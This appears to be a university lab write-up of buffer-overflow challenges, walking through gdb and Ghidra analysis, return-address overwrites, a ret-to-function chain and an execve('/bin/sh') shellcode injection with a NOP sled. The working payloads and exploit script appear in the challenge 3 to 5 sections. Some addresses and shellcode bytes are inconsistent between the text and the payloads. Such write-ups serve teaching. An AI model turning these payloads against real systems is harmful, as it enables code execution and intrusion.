# buffer-overflow-exercises
A collection of buffer-overflow based challenges from advanced-cyber course in College Of Managment

## 2nd challenge
### Goal: get the correct password  

*Disclaimer: the password is seen straightaway with ghidra. I did it using debugging the assembly in order to learn and have fun.  
</br>After a run with a random password we see that we're entering the wrong password.
```
$ ./two
Password: testpassword
You shall not pass, BYE!
```
Lets see what happens behind the scenes:
```
$ gdb two
(gdb) disass main
```
```assembly
Dump of assembler code for function main:
   0x08048803 <+0>:     lea    ecx,[esp+0x4]
   0x08048807 <+4>:     and    esp,0xfffffff0
   0x0804880a <+7>:     push   DWORD PTR [ecx-0x4]
   0x0804880d <+10>:    push   ebp
   0x0804880e <+11>:    mov    ebp,esp
   0x08048810 <+13>:    push   ecx
   0x08048811 <+14>:    sub    esp,0x24
   0x08048814 <+17>:    mov    DWORD PTR [ebp-0xc],0x8048ab7
   0x0804881b <+24>:    mov    DWORD PTR [ebp-0x10],0x8048ad4
   0x08048822 <+31>:    mov    DWORD PTR [ebp-0x14],0x8048aee
   0x08048829 <+38>:    sub    esp,0x8
   0x0804882c <+41>:    push   0x8048b0a
   0x08048831 <+46>:    push   0x804a100
   0x08048836 <+51>:    call   0x8048610 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x0804883b <+56>:    add    esp,0x10
   0x0804883e <+59>:    sub    esp,0x8
   0x08048841 <+62>:    lea    eax,[ebp-0x28]
   0x08048844 <+65>:    push   eax
   0x08048845 <+66>:    push   0x804a060
   0x0804884a <+71>:    call   0x8048620 <_ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_@plt>
   0x0804884f <+76>:    add    esp,0x10
   0x08048852 <+79>:    sub    esp,0xc
   0x08048855 <+82>:    lea    eax,[ebp-0x28]
   0x08048858 <+85>:    push   eax
   0x08048859 <+86>:    call   0x804876b <_Z5loginPc>
   0x0804885e <+91>:    add    esp,0x10
   0x08048861 <+94>:    mov    eax,0x0
   0x08048866 <+99>:    mov    ecx,DWORD PTR [ebp-0x4]
   0x08048869 <+102>:   leave
   0x0804886a <+103>:   lea    esp,[ecx-0x4]
   0x0804886d <+106>:   ret
End of assembler dump.
```
</br>This 32bit binary is using _CDECl_ calling convenction.  
we'll not dive into it but the thing relevant to us in this calling convention is that
in _CDECL_ function's arguments are **pushed onto the stack**  
We can break this long code into three main parts.</br>
```assembly
   0x0804882c <+41>:    push   0x8048b0a
   0x08048831 <+46>:    push   0x804a100
   0x08048836 <+51>:    call   0x8048610 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x0804883b <+56>:    add    esp,0x10
```
^ Pushing the string ("Password: \n") to the stack before calling to an ostream function (printf).  
Simply passing it as an argument to the function; according to _cdecl_ calling convention
```assembly
   0x0804883e <+59>:    sub    esp,0x8
   0x08048841 <+62>:    lea    eax,[ebp-0x28]
   0x08048844 <+65>:    push   eax
   0x08048845 <+66>:    push   0x804a060
   0x0804884a <+71>:    call   0x8048620 <_ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_@plt>
   0x0804884f <+76>:    add    esp,0x10
```
^ calling istream function that gets our input and puts it into eax (which points to address on the stack)  
```assembly
   0x08048858 <+85>:    push   eax
   0x08048859 <+86>:    call   0x804876b <_Z5loginPc>
   0x0804885e <+91>:    add    esp,0x10
```
^ Calling **login** function with eax as parameter

Lets disass login():
```assembly
Dump of assembler code for function _Z5loginPc:
   0x0804876b <+0>:     push   ebp
   0x0804876c <+1>:     mov    ebp,esp
   0x0804876e <+3>:     sub    esp,0x28
   0x08048771 <+6>:     mov    DWORD PTR [ebp-0xc],0x8048997
   0x08048778 <+13>:    mov    DWORD PTR [ebp-0x10],0x80489aa
   0x0804877f <+20>:    mov    DWORD PTR [ebp-0x14],0x80489c1
   0x08048786 <+27>:    sub    esp,0x8
   0x08048789 <+30>:    push   0x80489c9
   0x0804878e <+35>:    push   DWORD PTR [ebp+0x8]
   0x08048791 <+38>:    call   0x8048650 <strcmp@plt>
   0x08048796 <+43>:    add    esp,0x10
   0x08048799 <+46>:    test   eax,eax
   0x0804879b <+48>:    jne    0x80487da <_Z5loginPc+111>
   0x0804879d <+50>:    sub    esp,0x8
   0x080487a0 <+53>:    push   0x80489db
   0x080487a5 <+58>:    push   0x804a100
   0x080487aa <+63>:    call   0x8048610 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x080487af <+68>:    add    esp,0x10
   0x080487b2 <+71>:    sub    esp,0x8
   0x080487b5 <+74>:    push   0x8048640
   0x080487ba <+79>:    push   eax
   0x080487bb <+80>:    call   0x8048630 <_ZNSolsEPFRSoS_E@plt>
   0x080487c0 <+85>:    add    esp,0x10
   0x080487c3 <+88>:    mov    DWORD PTR [ebp-0x18],0x80489e3
   0x080487ca <+95>:    mov    DWORD PTR [ebp-0x1c],0x8048a01
   0x080487d1 <+102>:   mov    DWORD PTR [ebp-0x20],0x8048a12
   0x080487d8 <+109>:   jmp    0x8048800 <_Z5loginPc+149>
   0x080487da <+111>:   sub    esp,0x8
   0x080487dd <+114>:   push   0x8048a30
   0x080487e2 <+119>:   push   0x804a100
   0x080487e7 <+124>:   call   0x8048610 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x080487ec <+129>:   add    esp,0x10
   0x080487ef <+132>:   sub    esp,0x8
   0x080487f2 <+135>:   push   0x8048640
   0x080487f7 <+140>:   push   eax
   0x080487f8 <+141>:   call   0x8048630 <_ZNSolsEPFRSoS_E@plt>
   0x080487fd <+146>:   add    esp,0x10
   0x08048800 <+149>:   nop
   0x08048801 <+150>:   leave
   0x08048802 <+151>:   ret
End of assembler dump.
```
We know that the login function got our input as a parameter and is determing if our password is correct or not.  
```assembly
   0x08048789 <+30>:    push   0x80489c9
   0x0804878e <+35>:    push   DWORD PTR [ebp+0x8]
   0x08048791 <+38>:    call   0x8048650 <strcmp@plt>
```
There is a call to _strcmp_ that takes two parameters.
 1. A static string stored at **0x80489c9**.
 2. And a second string that is stored on the stack(our input password).

Lets examine the static string:  
```
(gdb)x/s 0x80489c9

0x80489c9:      "whatarethechances"
```
**Yahoo!! we got the password**
```
$ ./two 
Password: whatarethechances
Welcome
```
**Success!!**</br>
## 3rd challenge
### Goal: make the binary print "drink coffee"  

First we run the binary:
```
$ ./three 
testpassword
Do not drink coffee
 ```
We can see that upon entering a password the following two strings are printed- “Do not” and “drink coffee”. 
```assembly
Dump of assembler code for function main:
   0x080486a8 <+0>:     lea    ecx,[esp+0x4]
   0x080486ac <+4>:     and    esp,0xfffffff0
   0x080486af <+7>:     push   DWORD PTR [ecx-0x4]
   0x080486b2 <+10>:    push   ebp
   0x080486b3 <+11>:    mov    ebp,esp
   0x080486b5 <+13>:    push   ecx
   0x080486b6 <+14>:    sub    esp,0x4
   0x080486b9 <+17>:    call   0x804868b <_Z3foov>
   0x080486be <+22>:    sub    esp,0x8
   0x080486c1 <+25>:    push   0x80487e0
   0x080486c6 <+30>:    push   0x804a0e0
   0x080486cb <+35>:    call   0x8048560 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>        
   0x080486d0 <+40>:    add    esp,0x10
   0x080486d3 <+43>:    sub    esp,0x8
   0x080486d6 <+46>:    push   0x80487e8
   0x080486db <+51>:    push   0x804a0e0
   0x080486e0 <+56>:    call   0x8048560 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>        
   0x080486e5 <+61>:    add    esp,0x10
   0x080486e8 <+64>:    mov    eax,0x0
   0x080486ed <+69>:    mov    ecx,DWORD PTR [ebp-0x4]
   0x080486f0 <+72>:    leave
   0x080486f1 <+73>:    lea    esp,[ecx-0x4]
   0x080486f4 <+76>:    ret
End of assembler dump.
```
</br>Our target is to execute only the “drink coffee” print without the “Do not” print.  
After a brief look on the assembly code we can see that there are two prints: **<+35>** and **<+56>**  
There is no jump or compare before any of them so we need to think of a way to tamper with the execution flow.

**<+17>** we can see a call to foo. let’s disassemble using ghidra:</br>
```C
void foo(void)
{
  char local_lc[24];
  cin >> local_lc;
  return;
}
```

</br>We can use a buffer overflow attack and manipulate the return instruction pointer into our liking.  
Lets examine the stack upon entering a value:</br>

```
$ gdb three
b *foo+27
r <<(python2 -c "print('A'*24)")
```

```
gef➤  x/10x $esp
0xffffcf60:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcf70:     0x41414141      0x41414141      0xffffcf00      0x080486be
0xffffcf80:     0xffffcfb0      0xffffcfa0
```

</br>After inserting the letter ‘A’ 24 times, we can see the hex code 41 appears 24 times in our stack
Another interesting thing we can see is the return address (0x080486be) in the stack, right after the saved frame pointer address.
So, after inspecting the stack we can assume it looks like this:  

```
top of the stack                                             bottom of stack
<------ [            buf[24]            ] [  ebp[4]  ] [  ret[4]  ]
bottom of memory                                             top of memory
```

</br>There is a simple trick here, when **foo** is executing ```ret``` the saved return is popped from the stack and jumped to.  
In order to change the execution flow we want to overwrite the saved eip to skip the “Do not” print.  

After understanding the security flaw we can **overwrite the return address** by exploiting the buffer overflow.  
We’ll craft the payload like this: 24 characters for padding + main’s ebp + new return address

The line we need to jump to is line <main +40> 0x080486d0  
The os is using Little endian architecture

![image](https://github.com/0xtal4/buffer-overflow-exercises/assets/48101413/8a8ed180-4a35-4715-970a-99d88ecbb893)  

So, in order to overwrite the eip to **0x080486d0** we need to write **0xd0860408**  
In order to avoid segfault we need to overwrite the correct saved frame pointer to the ebp of main.

```
gef➤  info registers
eax            0x80486a8           0x80486a8
ecx            0xffffcfa0          0xffffcfa0
edx            0xffffcfc0          0xffffcfc0
ebx            0xf7a1dff4          0xf7a1dff4
esp            0xffffcf88          0xffffcf88
ebp            0xffffcf88          0xffffcf88
esi            0x8048760           0x8048760
edi            0xf7ffcba0          0xf7ffcba0
eip            0x80486b5           0x80486b5 <main+13>
eflags         0x286               [ PF SF IF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
```

Main's ebp=**0xffffcf88** 
The final payload will be
```python
#                 padding        sfp(little endian)    ret(little endian)
python2 -c "print('A'*24    +   '\x88\xcf\xff\xff'+   '\xd3\x86\x04\x08')"
```
```
gef➤  r <<(python2 -c "print('A'*24+'\x88\xcf\xff\xff\xd3\x86\x04\x08')")
Starting program: /home/kali/Desktop/tasks/files/three <<(python2 -c "print('A'*24+'\x88\xcf\xff\xff\xd3\x86\x04\x08')")
[Thread debugging using libthread_db enabled]                                                                                                                                                
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".                                                                                                                   
drink coffee[Inferior 1 (process 28524) exited normally]
```

Success! “drink coffee” is printed!
</bar>
## 4th challenge
### Goal: make the binary print "Welcome"</br>

Let’s disassemble main
```c
undefined4 main(void)
{
 bar();
 return 0;
}
```
```c
void bar(void)
{
 char local_70[108];
 gets(local_70);
 return;
}
```
There is no “Welcome” in the current execution flow.
And from first insight we can see that bar() function is vulnerable to buffer overflow.
Maybe - we can manipulate the return address into a segment in the code that prints “Welcome”.

```bash
$ strings four | grep Welcome
Welcome
```
The string “Welcome” is existing in the binary.
Lets check for some functions that are unseen straightforward in ghidra.
```
objdump -d ./four
```
```assembly
0804862b <_Z3foov>:
 804862b:       55                      push   %ebp
 804862c:       89 e5                   mov    %esp,%ebp
 804862e:       83 ec 08                sub    $0x8,%esp
 8048631:       83 ec 08                sub    $0x8,%esp
 8048634:       68 70 87 04 08          push   $0x8048770
 8048639:       68 40 a0 04 08          push   $0x804a040
 804863e:       e8 cd fe ff ff          call   8048510 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
 8048643:       83 c4 10                add    $0x10,%esp
 8048646:       90                      nop
 8048647:       c9                      leave
 8048648:       c3                      ret
```
There is a function named foo thats printing a string, examine using ghidra:
```c
void foo(void)

{
  std::operator<<((basic_ostream *)std::cout,"Welcome\n");
  return;
}
```
This function is printing Welcome.  
**Our goal is to change the execution flow to make our program execute foo().**  
</br>The execution flow should be like this:
 1. manipulate **bar** to return to **foo**
 2. make **foo** return to exit()

As we saw earlier bar is vulnerable to buffer overflow and its stack looks like this-

```
top of the stack                                             bottom of stack
<------ [            buf[108]            ] [ ebp[4]  ] [  ret[4]  ]
bottom of memory                                             top of memory
```

By overflowing the buffer we can overwrite bar's saved return address into foo’s address.

```
$ objdump -d four | grep foo
0804862b <_Z3foov>:
```

foo’s address is 0x0804862b  
Because of endianness we’ll use 0x2b860408 in our payload.  
In order to avoid segfault we’ll make the foo function return to exit function call.  

![image](https://github.com/0xtal4/buffer-overflow-exercises/assets/48101413/dc26c2b0-6084-44e0-8c53-3f3e43dc7a01)

After debugging the main, exit’s function address is 0xf783c130.

Two principles that will help us exploit:
  1. Call instruction is pushing the eip onto the stack; so when foo’s is executing it’s assuming that the return address is already pushed.
  2. When foo will execute ret operation it’ll pop the return address from the stack and jump.

Knowing this, in order to make foo’s return to any address as we wish we need to “push” the wanted return address onto its stack.  
</br>
![image](https://github.com/0xtal4/buffer-overflow-exercises/assets/48101413/cdde1dbf-949f-405d-b881-dd764a02514f)

bar’s last operation before returning to foo is “leave” which can be translated to:

```assembly
mov esp,ebp
pop ebp
```

</br>It means that foo’s stack will start where bar’s stack ends, like so:

```
top of the stack                                                         bottom of stack
         __________bar's stack___________   __________foo's stack___________ 
        |                                | |                                |
<------ [ buf[108] ] [ ebp[4] ] [ ret[4] ]
bottom of memory                                                         top of memory
```

</br>We can overflow into foo’s stack and write the return address onto its stack and by doing this we mimic a natural “call” operation where before jumping into the function the return address is pushed onto the stack.
By doing this we can make **foo** returning to **exit** and avoid segfault!!!


Crafting the payload:

```python
#       padding     foo’s address      exit call(little endian)
print( 'A'*112  + '\x2b\x86\x04\x08' + '\x30\xc1\x83\xf7' )
```

```bash
$ python2 -c "print( 'A'*112  + '\x2b\x86\x04\x08' + '\x30\xc1\x83\xf7' )" | ./four 

Welcome

```
**Success!!**
</br>
## 5th challenge
### Goal: inject and run shellcode by exploiting buffer overflow
```bash
$ checksec five                          
[*] '/home/kali/Desktop/tasks/files/five'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```
</br>There are no active defence mechanism in this binary so this should be straightforward.  
Lets disassemble using ghidra:</br>
```c
undefined4 main(void)
{
 foo();
 return 0;
}
```
```c
void foo(void)
{
 char local_70[108];
 cin >> local_70;
 return;
}
```
</br>**foo** is vulnerable to buffer overflow.  
In order to overflow buffer we need to write more than 108 characters.  

We'll use the shellcode:  
```
\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```
A simple 27bytes shellcode that's executing dash shell.  
</br>
First- we'll find the address that our input will be stored in.  

```assembly
Dump of assembler code for function _Z3foov:
   0x0804860b <+0>:     push   ebp
   0x0804860c <+1>:     mov    ebp,esp
   0x0804860e <+3>:     sub    esp,0x78
   0x08048611 <+6>:     sub    esp,0x8
   0x08048614 <+9>:     lea    eax,[ebp-0x6c]
   0x08048617 <+12>:    push   eax
   0x08048618 <+13>:    push   0x804a040
   0x0804861d <+18>:    call   0x80484f0 <_ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_@plt>
   0x08048622 <+23>:    add    esp,0x10
   0x08048625 <+26>:    nop
   0x08048626 <+27>:    leave
   0x08048627 <+28>:    ret
End of assembler dump.
```
```
$gdb five
(gdb) b *foo+27
(gdb) r <<< $(python2 -c "print('A'*108)")
(gdb) x/40x $esp
0xbfffed80:	0x00000002	0x00000001	0xbfffedc8	0x41414141
0xbfffed90:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffeda0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffedb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffedc0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffedd0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffede0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffedf0:	0x41414141	0x41414141	0xbfffee00	0x0804863e
```
</br>we’ll use the address **0xbfffed90** --> **0x90edffbf** (endianness)
**foo’s** stack is looking like this:
```
top of the stack                                             bottom of stack
<------ [            buf[108]            ] [ ebp[4]  ] [  ret[4]  ]
bottom of memory                                             top of memory
```
</br>So, in order to execute our shellcode we will:
 1. fill the buffer with nop operations (this process is called nop-slide).
 2. write our shell code
 3. overwrite the return address to the stack address (where our payload is located).  </br>
```python
#!/usr/bin/python
nopsled = '\x90'*60
shellcode='\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x08\x40\x40\x40\xcd\x80'
padding = 'A'*(112-60-27)
eip='\x90\xed\xff\xbf'
print nopsled + shellcode + padding+eip
```
```bash
$ ./exploit.py > ex
```
```
(gdb) r < ex
Starting program: /home/vboxuser/Desktop/five < ex
process 12822 is executing new program: /bin/dash
[Inferior 1 (process 12822) exited normally]
```
The proccess is executing /bin/dash - **Success!!**

